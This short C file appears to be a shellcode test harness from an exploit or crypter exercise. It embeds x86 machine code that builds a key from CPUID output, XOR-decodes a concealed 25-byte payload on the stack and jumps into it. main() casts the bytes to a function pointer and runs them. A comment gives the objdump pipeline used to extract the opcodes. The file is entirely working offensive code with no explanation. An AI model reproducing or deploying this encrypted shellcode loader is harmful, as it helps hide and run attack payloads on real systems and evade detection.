
//for i in `objdump -d decryptor | tr '\t' ' ' | tr ' ' '\n' | egrep '^[0-9a-f]{2}$' ` ; do echo -n "\x$i" ; done

#include<stdio.h>
#include<string.h>

unsigned char code[] =  
"\x31\xc0\x31\xdb\x31\xd2\x31\xc9\xb0\x01\x0f\xa2\x01\xd8\x01\xc8\x01\xd0\x31\xdb\x31\xd2\x31\xc9\x83\xec\x48\x31\xdb\x89\x5c\x24\x3c\x89\x5c\x24\x38\xc7\x44\x24\x1e\xda\xfc\xff\x67\xc7\x44\x24\x22\xc4\x13\xdc\x67\xc7\x44\x24\x26\x83\x13\xcd\x66\xc7\x44\x24\x2a\x85\xb5\x4c\x5f\xc7\x44\x24\x2e\x62\xde\xfc\x86\xc7\x44\x24\x32\x0a\x8c\xa4\xc2\xc6\x44\x24\x36\x6b\x89\x44\x24\x19\x88\x5c\x24\x1d\x31\xc9\xb1\x19\x8b\x44\x24\x3c\x99\xc1\xea\x1e\x01\xd0\x83\xe0\x03\x29\xd0\x89\x44\x24\x38\x8d\x54\x24\x1e\x8b\x44\x24\x3c\x01\xd0\x31\xdb\x31\xd2\x8a\x18\x88\xda\x8d\x5c\x24\x19\x8b\x44\x24\x38\x01\xd8\x31\xdb\x8a\x18\x31\xc0\x88\xd8\x31\xd0\x8d\x5c\x24\x1e\x8b\x54\x24\x3c\x01\xda\x88\x02\x83\x44\x24\x3c\x01\xe2\xb4\x8d\x44\x24\x1e\xff\xe0\x31\xc0\xb0\x01\x31\xdb\xcd\x80";

main()  
{

    printf("Shellcode Length:  %d\n", strlen(code));

    int (*ret)() = (int(*)())code;

    ret();

}
